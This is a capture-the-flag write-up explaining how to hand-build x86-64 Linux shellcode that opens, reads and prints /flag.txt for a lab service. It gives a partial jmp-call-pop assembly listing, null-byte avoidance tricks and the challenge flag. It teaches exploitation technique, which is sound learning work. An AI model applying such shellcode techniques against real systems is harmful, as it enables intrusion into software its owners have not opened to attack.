---
title: "1337 Local CTF: shellcode — open/read/write /flag.txt"
published: 2026-06-27
description: "Hand-building x86-64 Linux shellcode with jmp-call-pop and null-byte avoidance."
tags: [1337CTF, CTF, Pwn, Shellcode, x86_64]
category: CTF
image: ./cover.png
draft: false
---

# shellcode

## Challenge Context

The service accepted raw shellcode and executed it. The goal was to read `/flag.txt` and write it to stdout.

## Core Idea

Use standard x86-64 Linux syscalls:

```text
open("/flag.txt", O_RDONLY)
read(fd, stack, 0x100)
write(1, stack, n)
exit(0)
```

The main engineering constraint was avoiding bad bytes in the code section.

## Exploitation

The shellcode used the jmp-call-pop pattern so the path string could live inline without hardcoded addresses:

```text
jmp string_loader
main:
  pop rdi          ; rdi -> "/flag.txt"
  xor esi, esi     ; flags = O_RDONLY
  mov al, 2        ; SYS_open
  syscall
  ... read/write ...
string_loader:
  call main
  db "/flag.txt", 0
```

Null-byte avoidance tricks:

- `xor reg, reg` instead of `mov reg, 0`
- `mov dh, 1` instead of `mov rdx, 0x100`
- `inc rdi` instead of `mov rdi, 1`
- keep the string terminator in data, not as an immediate in code

## Flag

```text
Leet{5h3llc0d3_15_4w350m3}
```

## Lesson Learned

For shellcode challenges, the syscall sequence is usually simple. The real work is byte-level engineering: address independence, bad-byte avoidance, and knowing exactly how input is terminated.

---

Cover: [Wallhaven xelyx3](https://wallhaven.cc/w/xelyx3) — Serial Experiments Lain.
